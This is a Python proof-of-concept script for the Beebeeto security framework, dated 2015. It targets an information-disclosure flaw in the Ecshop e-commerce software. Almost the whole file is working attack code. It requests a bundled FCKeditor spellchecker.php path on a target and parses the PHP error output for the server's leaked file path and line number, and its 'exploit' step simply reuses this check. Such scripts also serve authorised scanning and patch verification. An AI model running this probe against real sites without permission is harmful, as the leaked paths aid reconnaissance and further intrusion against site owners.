#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0060',
            'name': 'Ecshop /spellchecker.php 信息泄漏漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-03-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Ecshop',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Ecshop漏洞', 'Ecshop信息泄漏漏洞', '/spellchecker.php', 'php'],
            'desc': 'N/A',
            'references': ['https://www.bugscan.net/#!/n/293',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php'
        verify_url = args['options']['target'] + payload
        req = requests.get(verify_url)
        if req.status_code == 200:
            m = re.search('in <b>([^<]+)</b> on line <b>(\d+)</b>', req.content)
            if m:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                return args
        args['success'] = False
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())